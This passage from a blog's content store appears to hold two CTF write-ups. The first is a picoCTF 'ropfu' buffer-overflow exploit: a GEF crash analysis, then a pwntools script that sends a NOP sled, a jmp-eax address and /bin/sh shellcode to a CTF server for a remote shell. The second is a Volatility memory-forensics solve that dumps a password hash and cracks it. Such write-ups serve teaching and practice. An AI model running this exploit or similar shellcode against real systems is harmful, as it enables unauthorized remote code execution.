0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 \r\n─────────────────────────────────────────────────────────────────── stack ────\r\n0xffffa5a0│+0x0000: \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\" ← $esp\r\n0xffffa5a4│+0x0004: \"jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]\"\r\n0xffffa5a8│+0x0008: \"kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]\"\r\n0xffffa5ac│+0x000c: \"laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]\"\r\n0xffffa5b0│+0x0010: \"maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]\"\r\n0xffffa5b4│+0x0014: \"naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaza[...]\"\r\n0xffffa5b8│+0x0018: \"oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]\"\r\n0xffffa5bc│+0x001c: \"paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabca[...]\"\r\n───────────────────────────────────────────────────────────── code:x86:32 ────\r\n[!] Cannot disassemble from $PC\r\n[!] Cannot access memory at address 0x61616168\r\n───────────────────────────────────────────────────────────────── threads ────\r\n[#0] Id 1, Name: \"vuln\", stopped 0x61616168 in ?? (), reason: SIGSEGV\r\n─────────────────────────────────────────────────────────────────── trace ────\r\n──────────────────────────────────────────────────────────────────────────────\r\ngef➤  pattern search haaa\r\n[+] Searching for '61616168'/'68616161' with period=4\r\n[+] Found at offset 25 (little-endian search) likely\r\n```\r\n\r\nPost-crash, the application's state was meticulously examined within the GDB debugging environment, enhanced by GEF. Focus was immediately placed on the EIP register. At the point of SIGSEGV, EIP was observed to hold the hexadecimal value `0x61616168`. This value, when interpreted in little-endian ASCII, corresponds to \"haaa\". Crucially, attempts to access or disassemble memory at this address resulted in invalid memory errors, confirming that the program's execution had been redirected to an uncontrolled, user-defined location.\r\n\r\nThe final step involved leveraging the unique property of the cyclic pattern. Using GEF's `pattern offset` utility, the captured EIP value (`0x61616168` or \"haaa\") was submitted for analysis. The tool's output, `[+] Searching for '61616168'/'68616161' with period=4` and `[+] Found at offset 25 (little-endian search) likely`, definitively established that the EIP register is precisely overwritten beginning at the 25th byte of the input buffer.\r\n\r\n![Cyclic pattern analysis](/images/posts/ropfu/screenshot-1.png)\r\n\r\nWith the EIP offset now precisely identified, the next critical phase involves directing the program's execution to our controlled data. Our strategy hinges on leveraging a \"jump to EAX\" instruction, which effectively serves as a pivot point.\r\n\r\nDuring our analysis, we identified a `jmp eax` instruction located at the fixed memory address `0x0805333b`. This instruction is ideal for our purposes because, as its name suggests, it unconditionally transfers program control to the address currently held within the EAX register.\r\n\r\nRecall that our EAX register, as observed in the initial crash state (`$eax : 0xffff8cc0 → \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"`), already points directly into our input buffer. This means if we overwrite EIP with the address of `jmp eax` (i.e., `0x0805333b`), the CPU will then execute `jmp eax`. Because EAX points to a location within our input where we can place arbitrary code (like a NOP sled followed by shellcode), the program counter will consequently jump to that location and begin executing our injected instructions. This forms the direct path to achieving arbitrary code execution.\r\n\r\n![Jump to EAX instruction](/images/posts/ropfu/screenshot-2.png)\r\n\r\n![Memory layout](/images/posts/ropfu/screenshot-3.png)\r\n\r\n```python\r\nimport pwn \r\nimport sys\r\n\r\npayload = b'\\x90' * 26\r\npayload += b'\\xeb\\x04'\r\npayload += pwn.p32(0x0805333b)\r\npayload += pwn.asm(pwn.shellcraft.i386.linux.sh())\r\n\r\nwith open(\"output.bin\", \"wb\") as file:\r\n    file.write(payload)\r\n\r\np = pwn.remote('saturn.picoctf.net',61004 )\r\np.sendline(payload)\r\np.interactive()\r\n```\r\n\r\nA **No Operation (NOP)** instruction constitutes a fundamental opcode within various instruction set architectures (ISAs), designed to execute without altering the system's architectural state, beyond advancing the program counter. Its execution merely consumes a processing cycle, making it a critical primitive for fine-grained timing adjustments or as a benign filler in memory or instruction streams. In an x86 context, the NOP instruction is canonically represented by the hexadecimal byte `0x90`. Its operational simplicity belies its strategic utility in various low-level programming and system-level contexts.\r\n\r\nFrom an exploit development perspective, the NOP instruction is a cornerstone in the construction of a \"NOP sled\" or \"NOP slide,\" a widely adopted technique to enhance the reliability of memory corruption exploits, particularly buffer overflows. The inherent challenge in such exploits lies in precisely predicting the runtime memory address of attacker-controlled code (shellcode), especially in environments employing Address Space Layout Randomization (ASLR). A NOP sled mitigates this imprecision by creating a contiguous block of NOP instructions preceding the shellcode.\r\n\r\nWhen a vulnerable program's control flow is subverted-for instance, by overwriting a return address on the stack-the NOP sled ensures that even if the calculated target address is inexact, as long as it falls anywhere within the NOP-filled region, the processor will execute these benign instructions sequentially. This \"sliding\" mechanism guarantees that execution will inevitably reach the entry point of the embedded shellcode. Consequently, the NOP sled significantly expands the effective target area for the redirected control flow, thereby bolstering the exploit's success rate and robustness against minor environmental or architectural variations that might otherwise cause the exploit to fail due to misaligned jumps.\r\n\r\nThe core of the exploit lies in its meticulously constructed `payload`. It begins with a **NOP sled**, a sequence of 26 \"No Operation\" (`\\x90`) instructions. This NOP sled acts as a landing zone, providing a margin for error if the exact return address isn't perfectly precise. Following the NOPs, a short jump instruction (`\\xeb\\x04`, which translates to `jmp +6`) is appended. This jump is crucial; it bypasses the directly following 4-byte address, ensuring that execution continues into the shellcode. The `0x0805333b` address, packed using `pwn.p32()`, is then added. This address is highly likely to be the calculated return address that, when overwritten on the vulnerable program's stack, will redirect the program's execution flow. Finally, the payload incorporates the actual malicious code: `pwn.asm(pwn.shellcraft.i386.linux.sh())`. This command generates 32-bit (i386) Linux shellcode that, upon successful execution, will spawn a `/bin/sh` shell, granting the attacker interactive command-line access to the remote system.\r\n\r\nFor debugging and analysis purposes, the crafted `payload` is also written to a file named \"output.bin\". This allows security researchers or CTF participants to inspect the exact bytes being sent, which can be invaluable for understanding the exploit's structure and behavior.\r\n\r\nThe exploit's execution then shifts to interacting with the remote target. A connection is established using `pwn.remote('saturn.picoctf.net', 61004)`, targeting a server at `saturn.picoctf.net` on port `61004`. Once connected, the `payload` is sent to the server using `p.sendline(payload)`. This action typically injects the carefully constructed payload into a vulnerable buffer on the remote program, overwriting the return address and causing the program to execute the NOP sled and subsequently the shellcode. The final command, `p.interactive()`, is critical for post-exploitation. If the exploit is successful and the shellcode executes as intended, `p.interactive()` takes over the current terminal, allowing the user to directly interact with the newly spawned remote shell on `saturn.picoctf.net`, effectively giving them control over the compromised system.\r\n\r\n![Successful exploitation](/images/posts/ropfu/screenshot-4.png)","src/content/blog/ropfu.md","39ee4e2d93226289",{"html":94,"metadata":95},"\u003Cp>Initially, observed application behavior indicated a classic buffer overflow vulnerability. Supplying an oversized input string consistently led to a segmentation fault. Debugger analysis at this failure point confirmed EIP register corruption, signifying that our input had successfully diverted the execution flow-though without specific direction.\u003C/p>\n\u003Cp>To gain this specific direction, a precise instrument was required: the cyclic pattern. This specially crafted string is designed with a fundamental property: every 4-byte (for 32-bit systems) or 8-byte (for 64-bit systems) sequence embedded within it is unique. This characteristic enables a direct correlation between any captured register value and its exact original position within the pattern. A pattern of sufficient length, typically 500 bytes, was generated and delivered as the payload, reliably reproducing the crash.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>[ Legend: Modified register | Code | Heap | Stack | String ]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>─────────────────────────────────────────────────────────────── registers ────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$eax   : 0xfffffe00\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$ebx   : 0x0       \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$ecx   : 0x080e8330  →  0x00000000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$edx   : 0x400     \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$esp   : 0xffffa470  →  0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$ebp   : 0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$esi   : 0x0       \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$edi   : 0x080e5300  →  &#x3C;_IO_2_1_stdin_+0000> mov BYTE PTR [edx], ah\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$eip   : 0xf7ffc5b9  →  &#x3C;__kernel_vsyscall+0009> pop ebp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>─────────────────────────────────────────────────────────────────── stack ────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa470│+0x0000: 0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000\t← $esp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa474│+0x0004: 0x00000400\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa478│+0x0008: 0x080e8330  →  0x00000000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa47c│+0x000c: 0x0806ed0b  →  &#x3C;read+002b> mov ebx, eax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa480│+0x0010: 0x080e5300  →  &#x3C;_IO_2_1_stdin_+0000> mov BYTE PTR [edx], ah\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa484│+0x0014: 0x080e6140  →  &#x3C;_IO_file_jumps+0000> add BYTE PTR [eax], al\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[ Legend: Modified register | Code | Heap | Stack | String ]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>─────────────────────────────────────────────────────────────── registers ────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$eax   : 0xffffa580  →  \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$ebx   : 0x61616166 (\"faaa\"?)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$ecx   : 0x080e5300  →  &#x3C;_IO_2_1_stdin_+0000> mov BYTE PTR [edx], ah\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$edx   : 0xffffa601  →  0x00000000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$esp   : 0xffffa5a0  →  \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$ebp   : 0x61616167 (\"gaaa\"?)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$esi   : 0x080e5000  →  &#x3C;_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$edi   : 0x080e5000  →  &#x3C;_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$eip   : 0x61616168 (\"haaa\"?)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>─────────────────────────────────────────────────────────────────── stack ────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5a0│+0x0000: \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\" ← $esp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5a4│+0x0004: \"jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5a8│+0x0008: \"kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5ac│+0x000c: \"laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5b0│+0x0010: \"maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5b4│+0x0014: \"naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaza[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5b8│+0x0018: \"oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xffffa5bc│+0x001c: \"paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabca[...]\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>───────────────────────────────────────────────────────────── code:x86:32 ────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[!] Cannot disassemble from $PC\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[!] Cannot access memory at address 0x61616168\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>───────────────────────────────────────────────────────────────── threads ────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[#0] Id 1, Name: \"vuln\", stopped 0x61616168 in ?? (), reason: SIGSEGV\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>─────────────────────────────────────────────────────────────────── trace ────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>──────────────────────────────────────────────────────────────────────────────\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>gef➤  pattern search haaa\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[+] Searching for '61616168'/'68616161' with period=4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[+] Found at offset 25 (little-endian search) likely\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Post-crash, the application’s state was meticulously examined within the GDB debugging environment, enhanced by GEF. Focus was immediately placed on the EIP register. At the point of SIGSEGV, EIP was observed to hold the hexadecimal value \u003Ccode>0x61616168\u003C/code>. This value, when interpreted in little-endian ASCII, corresponds to “haaa”. Crucially, attempts to access or disassemble memory at this address resulted in invalid memory errors, confirming that the program’s execution had been redirected to an uncontrolled, user-defined location.\u003C/p>\n\u003Cp>The final step involved leveraging the unique property of the cyclic pattern. Using GEF’s \u003Ccode>pattern offset\u003C/code> utility, the captured EIP value (\u003Ccode>0x61616168\u003C/code> or “haaa”) was submitted for analysis. The tool’s output, \u003Ccode>[+] Searching for '61616168'/'68616161' with period=4\u003C/code> and \u003Ccode>[+] Found at offset 25 (little-endian search) likely\u003C/code>, definitively established that the EIP register is precisely overwritten beginning at the 25th byte of the input buffer.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/ropfu/screenshot-1.png\" alt=\"Cyclic pattern analysis\">\u003C/p>\n\u003Cp>With the EIP offset now precisely identified, the next critical phase involves directing the program’s execution to our controlled data. Our strategy hinges on leveraging a “jump to EAX” instruction, which effectively serves as a pivot point.\u003C/p>\n\u003Cp>During our analysis, we identified a \u003Ccode>jmp eax\u003C/code> instruction located at the fixed memory address \u003Ccode>0x0805333b\u003C/code>. This instruction is ideal for our purposes because, as its name suggests, it unconditionally transfers program control to the address currently held within the EAX register.\u003C/p>\n\u003Cp>Recall that our EAX register, as observed in the initial crash state (\u003Ccode>$eax : 0xffff8cc0 → \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"\u003C/code>), already points directly into our input buffer. This means if we overwrite EIP with the address of \u003Ccode>jmp eax\u003C/code> (i.e., \u003Ccode>0x0805333b\u003C/code>), the CPU will then execute \u003Ccode>jmp eax\u003C/code>. Because EAX points to a location within our input where we can place arbitrary code (like a NOP sled followed by shellcode), the program counter will consequently jump to that location and begin executing our injected instructions. This forms the direct path to achieving arbitrary code execution.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/ropfu/screenshot-2.png\" alt=\"Jump to EAX instruction\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/ropfu/screenshot-3.png\" alt=\"Memory layout\">\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pwn \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sys\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\x90\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 26\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#F97583\"> b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\xeb\\x04\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pwn.p32(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0805333b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pwn.asm(pwn.shellcraft.i386.linux.sh())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">with\u003C/span>\u003Cspan style=\"color:#79B8FF\"> open\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"output.bin\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"wb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#FFAB70\"> file\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#FFAB70\">    file\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.write(payload)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">p \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pwn.remote(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'saturn.picoctf.net'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">61004\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> )\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">p.sendline(payload)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">p.interactive()\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>A \u003Cstrong>No Operation (NOP)\u003C/strong> instruction constitutes a fundamental opcode within various instruction set architectures (ISAs), designed to execute without altering the system’s architectural state, beyond advancing the program counter. Its execution merely consumes a processing cycle, making it a critical primitive for fine-grained timing adjustments or as a benign filler in memory or instruction streams. In an x86 context, the NOP instruction is canonically represented by the hexadecimal byte \u003Ccode>0x90\u003C/code>. Its operational simplicity belies its strategic utility in various low-level programming and system-level contexts.\u003C/p>\n\u003Cp>From an exploit development perspective, the NOP instruction is a cornerstone in the construction of a “NOP sled” or “NOP slide,” a widely adopted technique to enhance the reliability of memory corruption exploits, particularly buffer overflows. The inherent challenge in such exploits lies in precisely predicting the runtime memory address of attacker-controlled code (shellcode), especially in environments employing Address Space Layout Randomization (ASLR). A NOP sled mitigates this imprecision by creating a contiguous block of NOP instructions preceding the shellcode.\u003C/p>\n\u003Cp>When a vulnerable program’s control flow is subverted-for instance, by overwriting a return address on the stack-the NOP sled ensures that even if the calculated target address is inexact, as long as it falls anywhere within the NOP-filled region, the processor will execute these benign instructions sequentially. This “sliding” mechanism guarantees that execution will inevitably reach the entry point of the embedded shellcode. Consequently, the NOP sled significantly expands the effective target area for the redirected control flow, thereby bolstering the exploit’s success rate and robustness against minor environmental or architectural variations that might otherwise cause the exploit to fail due to misaligned jumps.\u003C/p>\n\u003Cp>The core of the exploit lies in its meticulously constructed \u003Ccode>payload\u003C/code>. It begins with a \u003Cstrong>NOP sled\u003C/strong>, a sequence of 26 “No Operation” (\u003Ccode>\\x90\u003C/code>) instructions. This NOP sled acts as a landing zone, providing a margin for error if the exact return address isn’t perfectly precise. Following the NOPs, a short jump instruction (\u003Ccode>\\xeb\\x04\u003C/code>, which translates to \u003Ccode>jmp +6\u003C/code>) is appended. This jump is crucial; it bypasses the directly following 4-byte address, ensuring that execution continues into the shellcode. The \u003Ccode>0x0805333b\u003C/code> address, packed using \u003Ccode>pwn.p32()\u003C/code>, is then added. This address is highly likely to be the calculated return address that, when overwritten on the vulnerable program’s stack, will redirect the program’s execution flow. Finally, the payload incorporates the actual malicious code: \u003Ccode>pwn.asm(pwn.shellcraft.i386.linux.sh())\u003C/code>. This command generates 32-bit (i386) Linux shellcode that, upon successful execution, will spawn a \u003Ccode>/bin/sh\u003C/code> shell, granting the attacker interactive command-line access to the remote system.\u003C/p>\n\u003Cp>For debugging and analysis purposes, the crafted \u003Ccode>payload\u003C/code> is also written to a file named “output.bin”. This allows security researchers or CTF participants to inspect the exact bytes being sent, which can be invaluable for understanding the exploit’s structure and behavior.\u003C/p>\n\u003Cp>The exploit’s execution then shifts to interacting with the remote target. A connection is established using \u003Ccode>pwn.remote('saturn.picoctf.net', 61004)\u003C/code>, targeting a server at \u003Ccode>saturn.picoctf.net\u003C/code> on port \u003Ccode>61004\u003C/code>. Once connected, the \u003Ccode>payload\u003C/code> is sent to the server using \u003Ccode>p.sendline(payload)\u003C/code>. This action typically injects the carefully constructed payload into a vulnerable buffer on the remote program, overwriting the return address and causing the program to execute the NOP sled and subsequently the shellcode. The final command, \u003Ccode>p.interactive()\u003C/code>, is critical for post-exploitation. If the exploit is successful and the shellcode executes as intended, \u003Ccode>p.interactive()\u003C/code> takes over the current terminal, allowing the user to directly interact with the newly spawned remote shell on \u003Ccode>saturn.picoctf.net\u003C/code>, effectively giving them control over the compromised system.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/ropfu/screenshot-4.png\" alt=\"Successful exploitation\">\u003C/p>",{"headings":96,"localImagePaths":97,"remoteImagePaths":98,"frontmatter":99,"imagePaths":101},[],[],[],{"title":87,"date":100,"excerpt":89},"2025-12-29",[],"gotham-hustle",{"id":102,"data":104,"body":107,"filePath":108,"digest":109,"rendered":110},{"title":105,"date":106},"Gotham Hustle, DFIR report",["Date","2025-01-04T00:00:00.000Z"],"# Description\r\nGotham's underbelly trembles as whispers spread—The Riddler's back, leaving cryptic puzzles across the city's darkest corners. Every clue is a trap, every answer another step into madness. Think you can outsmart him? Step into Gotham's shadows and prove it. Let the Batman's Hustle get its recognition!\r\n\r\n\r\n## Initial Analysis\r\n\r\nFirst, I ran imageinfo to identify the memory profile and basic system details.\r\n\r\n![Memory Profile](/images/posts/gotham-hustle/gotham-1.png)\r\n\r\n**System Information**\r\n- OS Profile: Win7SP1x64\r\n- Processors: 6 CPUs\r\n- Image Date/Time: 2024-08-06 18:37:19 UTC\r\n- Memory Size: 4.6 GB\r\n\r\n\r\n\r\n## Process Enumeration\r\n\r\nNext, I ran pslist to observe active processes.\r\n\r\n```text\r\n\r\ncmd.exe (PID 3944)\r\nnotepad.exe (PID 2592)\r\nmspaint.exe (PID 2516)\r\nmultiple chrome.exe processes\r\n````\r\n\r\n### Notable Processes\r\n\r\n* cmd.exe (PID 3944): Command prompt activity\r\n* notepad.exe (PID 2592): Notepad open\r\n* mspaint.exe (PID 2516): Paint running\r\n* Multiple chrome.exe: Browser activity\r\n\r\n\r\n\r\n## Command History\r\n\r\nTo check user activity, I ran cmdscan \r\n\r\n![Command History](/images/posts/gotham-hustle/gotham-2.png)\r\n\r\n```text\r\nCmd #4: Ymkwc2N0Znt3M2xjMG0zXw==\r\nCmd #5: azr43ln1ght.github.io\r\nCmd #6: Azr43lKn1ght\r\nCmd #7: did you find flag1?\r\n```\r\n\r\nThe base64 string decodes to:\r\n\r\n```\r\nbi0sctf{w3lc0m3_\r\n```\r\n\r\n\r\n\r\n## Notepad & Memory Strings\r\n\r\nDumping Notepad directly failed due to Volatility version mismatch.\r\nI dumped process memory and ran `strings`, which mostly yielded DLL data.\r\nOne extracted link led to the following page:\r\n\r\n![Notepad Strings](/images/posts/gotham-hustle/gotham-3.png)\r\n\r\nThis contained another base64 string, decoding to:\r\n\r\n```\r\nh0p3_th15_\r\n```\r\n\r\n\r\n\r\n## File Extraction\r\n\r\nFrom filescan, I noticed flag5.rar on the Desktop and dumped it:\r\n\r\n```powershell\r\nvol -f gotham.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000011fdaff20 --dump-dir=D:\\DFIR\r\n```\r\n\r\n![File Extraction](/images/posts/gotham-hustle/gotham-4.png)\r\n\r\nThe archive was password-protected.\r\n\r\n\r\n\r\n## Credential Dump\r\n\r\nUsing hashdump:\r\n\r\n```text\r\nbruce:1001:...:b7265f8cc4f00b58f413076ead262720:::\r\n```\r\n\r\n![Credential Dump](/images/posts/gotham-hustle/gotham-5.png)\r\n\r\nThe password was **batman**.\r\n\r\nExtracting the archive revealed another base64 string:\r\n\r\n![Archive Contents](/images/posts/gotham-hustle/gotham-6.png)\r\n\r\nDecoded:\r\n\r\n```\r\nm0r3_13337431}\r\n```\r\n\r\n\r\n\r\n## Flag 4\r\n\r\nDumping Notepad with procdump showed a search for flag4.\r\nRunning strings revealed:\r\n\r\n```\r\nYjNuM2YxNzVfeTB1Xw==\r\n```\r\n\r\n![Flag 4](/images/posts/gotham-hustle/gotham-7.png)\r\n\r\n\r\n\r\n## Flag 2 (MS Paint)\r\n\r\nFrom pslist, mspaint.exe was active.\r\nI dumped the process memory, renamed it to `.data`, and opened it in GIMP.\r\n\r\n![GIMP Analysis](/images/posts/gotham-hustle/gotham-8.png)\r\n\r\nI referred a writeup for the MS Paint part; the offsets there were not correct so I had to adjust them manually.\r\n\r\nI had to use **Unsigned Integer** because I was loading raw process memory, not a real image file. The pixel values in memory are stored as normal positive numbers, especially for RGB 16-bit, which expects values between 0 and 65535. When I tried signed or floating point, the same bytes were misinterpreted and the image completely fell apart into noise. Unsigned was the only option that kept the colors stable and readable. Since MSPaint stores its canvas as raw pixel data in memory without headers, I had to manually line everything up.\r\n\r\nAfter inspecting and tweaking values for hours, I finally managed to align a base64 string in the image:\r\n\r\n```\r\ndDBfZGYxcl9sNGl1Xw==\r\n```\r\n\r\nThe data appeared flipped in the output, so I rotated and flipped the image to make the text readable.\r\n\r\n![Final Flag](/images/posts/gotham-hustle/gotham-9.png)\r\n\r\nDecoding the base64 revealed the final combined 